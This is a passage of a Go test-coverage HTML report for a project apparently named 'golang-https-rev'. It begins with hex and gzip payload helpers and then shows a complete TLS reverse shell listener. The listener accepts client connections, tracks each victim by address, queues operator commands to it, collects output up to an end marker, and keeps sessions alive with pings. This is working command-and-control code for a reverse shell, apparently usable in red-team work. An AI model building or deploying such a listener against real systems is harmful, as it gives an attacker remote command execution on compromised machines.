                return "", fmt.Errorf("failed to close gzip writer: %w", err)
        }</span>
        <span class="cov8" title="1">return hex.EncodeToString(buf.Bytes()), nil</span>
}

// DecompressHex decodes a hex-encoded string and decompresses it using gzip.
// Returns the original uncompressed data.
func DecompressHex(payload string) ([]byte, error) <span class="cov8" title="1">{
        compressed, err := hex.DecodeString(payload)
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to decode hex: %w", err)
        }</span>

        <span class="cov8" title="1">gz, err := gzip.NewReader(bytes.NewReader(compressed))
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to create gzip reader: %w", err)
        }</span>
        <span class="cov8" title="1">defer gz.Close()

        data, err := io.ReadAll(gz)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to decompress data: %w", err)
        }</span>

        <span class="cov8" title="1">return data, nil</span>
}
</pre>
		
		<pre class="file" id="file6" style="display: none">package server

import (
        "bufio"
        "crypto/tls"
        "errors"
        "fmt"
        "io"
        "log"
        "net"
        "strings"
        "sync"
        "time"

        "golang-https-rev/pkg/protocol"
)

// Listener represents a TLS reverse shell listener server that accepts client connections,
// manages them, and dispatches commands to connected clients.
type Listener struct {
        port              string
        networkInterface  string
        tlsConfig         *tls.Config
        clientConnections map[string]chan string
        clientResponses   map[string]chan string
        clientPausePing   map[string]chan bool
        mutex             sync.Mutex
}

// NewListener creates a new reverse shell listener with the given port,
// network interface, and TLS configuration.
func NewListener(port, networkInterface string, tlsConfig *tls.Config) *Listener <span class="cov8" title="1">{
        return &amp;Listener{
                port:              port,
                networkInterface:  networkInterface,
                tlsConfig:         tlsConfig,
                clientConnections: make(map[string]chan string),
                clientResponses:   make(map[string]chan string),
                clientPausePing:   make(map[string]chan bool),
        }
}</span>

// Start begins listening for client connections on the configured port and interface.
// It returns the underlying net.Listener and starts accepting connections in a background goroutine.
func (l *Listener) Start() (net.Listener, error) <span class="cov8" title="1">{
        address := fmt.Sprintf("%s:%s", l.networkInterface, l.port)
        log.Printf("Starting TLS listener on %s", address)

        listener, err := tls.Listen("tcp", address, l.tlsConfig)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create TLS listener: %w", err)
        }</span>

        <span class="cov8" title="1">go l.acceptConnections(listener)
        return listener, nil</span>
}

// acceptConnections accepts incoming client connections
func (l *Listener) acceptConnections(listener net.Listener) <span class="cov8" title="1">{
        for </span><span class="cov8" title="1">{
                conn, err := listener.Accept()
                if err != nil </span><span class="cov8" title="1">{
                        log.Printf("Error accepting connection: %v", err)
                        continue</span>
                }
                <span class="cov8" title="1">go l.handleClient(conn)</span>
        }
}

// handleClient handles a single client connection
func (l *Listener) handleClient(conn net.Conn) <span class="cov8" title="1">{
        clientAddr := conn.RemoteAddr().String()
        log.Printf("[+] New client connected: %s", clientAddr)
        defer conn.Close()

        cmdChan := make(chan string, 10)
        respChan := make(chan string, 10)
        pausePing := make(chan bool, 1)

        l.mutex.Lock()
        l.clientConnections[clientAddr] = cmdChan
        l.clientResponses[clientAddr] = respChan
        l.clientPausePing[clientAddr] = pausePing
        l.mutex.Unlock()

        defer func() </span><span class="cov8" title="1">{
                l.mutex.Lock()
                delete(l.clientConnections, clientAddr)
                delete(l.clientResponses, clientAddr)
                delete(l.clientPausePing, clientAddr)
                l.mutex.Unlock()
                close(cmdChan)
                close(respChan)
                close(pausePing)
                log.Printf("[-] Client disconnected: %s", clientAddr)
        }</span>()

        <span class="cov8" title="1">reader := bufio.NewReaderSize(conn, protocol.BufferSize1MB)
        writer := bufio.NewWriterSize(conn, protocol.BufferSize1MB)

        // Track if response reader goroutine has failed
        readerFailed := make(chan bool, 1)

        // Read responses from client
        go func() </span><span class="cov8" title="1">{
                var responseBuffer strings.Builder
                for </span><span class="cov8" title="1">{
                        line, err := reader.ReadString('\n')

                        // Append what we received, even if the buffer filled before newline
                        responseBuffer.WriteString(line)

                        // If the buffer filled before we hit a newline, keep reading without closing the connection
                        if errors.Is(err, bufio.ErrBufferFull) </span><span class="cov0" title="0">{
                                if responseBuffer.Len() &gt; protocol.MaxBufferSize </span><span class="cov0" title="0">{
                                        log.Printf("Response from client %s exceeds max buffer size without delimiter; resetting buffer", clientAddr)
                                        responseBuffer.Reset()
                                }</span>
                                <span class="cov0" title="0">continue</span>
                        }

                        <span class="cov8" title="1">if err != nil </span><span class="cov8" title="1">{
                                if err != io.EOF </span><span class="cov0" title="0">{
                                        log.Printf("Error reading from client %s: %v", clientAddr, err)
                                }</span>
                                <span class="cov8" title="1">readerFailed &lt;- true
                                return</span>
                        }

                        // Check if we've reached the end of output marker anywhere in the buffer
                        <span class="cov0" title="0">if strings.Contains(responseBuffer.String(), protocol.EndOfOutputMarker) </span><span class="cov0" title="0">{
                                fullResponse := responseBuffer.String()
                                // Non-blocking send to avoid deadlock if response channel is full
                                select </span>{
                                case respChan &lt;- fullResponse:<span class="cov0" title="0"></span>
                                        // Successfully sent
                                default:<span class="cov0" title="0">
                                        // Channel full, drop this response and log warning
                                        log.Printf("Warning: response channel full for client %s, dropping response", clientAddr)</span>
                                }
                                <span class="cov0" title="0">responseBuffer.Reset()</span>
                        }
                }
        }()

        // Wait for commands
        <span class="cov8" title="1">pingTicker := time.NewTicker(protocol.PingInterval * time.Second)
        defer pingTicker.Stop()
        pingPaused := false

        for </span><span class="cov8" title="1">{
                select </span>{
                case cmd, ok := &lt;-cmdChan:<span class="cov8" title="1">
                        if !ok </span><span class="cov0" title="0">{
                                return
                        }</span>
                        <span class="cov8" title="1">fmt.Fprintf(writer, "%s\n", cmd)
                        writer.Flush()

                        if cmd == protocol.CmdExit </span><span class="cov0" title="0">{
                                return
                        }</span>
                case &lt;-readerFailed:<span class="cov8" title="1">
                        log.Printf("Reader failed for client %s, closing connection", clientAddr)
                        return</span>
                case pause := &lt;-pausePing:<span class="cov8" title="1">
                        pingPaused = pause</span>
                case &lt;-pingTicker.C:<span class="cov0" title="0">
                        // Only send PING if not paused (i.e., not waiting for command response)
                        if !pingPaused </span><span class="cov0" title="0">{
                                fmt.Fprintf(writer, "%s\n", protocol.CmdPing)
                                writer.Flush()
                        }</span>
                }
        }
}

// GetClients returns a list of currently connected client addresses.
func (l *Listener) GetClients() []string <span class="cov8" title="1">{
        l.mutex.Lock()
        defer l.mutex.Unlock()

        clients := make([]string, 0, len(l.clientConnections))
        for addr := range l.clientConnections </span><span class="cov8" title="1">{
                clients = append(clients, addr)
        }</span>
        <span class="cov8" title="1">return clients</span>
}

// SendCommand sends a command to a specific client identified by its address.
// It returns an error if the client is not found or if the send times out.
func (l *Listener) SendCommand(clientAddr, cmd string) error <span class="cov8" title="1">{
        l.mutex.Lock()
        cmdChan, exists := l.clientConnections[clientAddr]
        pauseChan, pauseExists := l.clientPausePing[clientAddr]
        l.mutex.Unlock()

        if !exists </span><span class="cov8" title="1">{
                return fmt.Errorf("client %s not found", clientAddr)
        }</span>

        // Pause PING to avoid interference with command response
        <span class="cov8" title="1">if pauseExists </span><span class="cov8" title="1">{
                select </span>{
                case pauseChan &lt;- true:<span class="cov8" title="1"></span>
                default:<span class="cov8" title="1"></span>
                }
        }

        <span class="cov8" title="1">select </span>{
        case cmdChan &lt;- cmd:<span class="cov8" title="1">
                return nil</span>
        case &lt;-time.After(protocol.ResponseTimeout * time.Second):<span class="cov0" title="0">
                return fmt.Errorf("timeout sending command")</span>
        }
}

// GetResponse waits for and returns the response from a client within the given timeout.
// It returns an error if the client is not found or if the timeout is exceeded.
func (l *Listener) GetResponse(clientAddr string, timeout time.Duration) (string, error) <span class="cov8" title="1">{
        l.mutex.Lock()
        respChan, exists := l.clientResponses[clientAddr]
        pauseChan, pauseExists := l.clientPausePing[clientAddr]
        l.mutex.Unlock()

        if !exists </span><span class="cov8" title="1">{
                return "", fmt.Errorf("client %s not found", clientAddr)
        }</span>

        // Resume PING after getting response
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{
                if pauseExists </span><span class="cov8" title="1">{
                        select </span>{
                        case pauseChan &lt;- false:<span class="cov8" title="1"></span>
                        default:<span class="cov0" title="0"></span>
                        }
                }
        }()

        <span class="cov8" title="1">select </span>{
        case resp := &lt;-respChan:<span class="cov0" title="0">
                return resp, nil</span>
        case &lt;-time.After(timeout):<span class="cov8" title="1">
                return "", fmt.Errorf("timeout waiting for response")</span>
        }
}

// GetClientAddressSorted returns sorted client addresses for consistent ordering
func (l *Listener) GetClientAddressesSorted() []string <span class="cov8" title="1">{
        l.mutex.Lock()
        defer l.mutex.Unlock()

        clients := make([]string, 0, len(l.clientConnections))
        for addr := range l.clientConnections </span><span class="cov0" title="0">{
                clients = append(clients, addr)
        }</span>
        // In a real implementation, you'd sort these
        <span class="cov8" title="1">return clients</span>
}
</pre>
		
		</div>
	</body>
	<script>
	(function() {
		var files = document.getElementById('files');
		var visible;
		files.addEventListener('change', onChange, false);
		function select(part) {
			if (visible)
				visible.style.display = 'none';
			visible = document.getElementById(part);
			if (!visible)
				return;
			files.value = part;
			visible.style.display = 'block';
			location.hash = part;
		}
		function onChange() {
			select(files.value);
			window.scrollTo(0, 0);
		}
		if (location.hash != "") {
			select(location.hash.substr(1));
		}
		if (!visible) {
			select("file0");
		}
	})();
	</script>
</html>
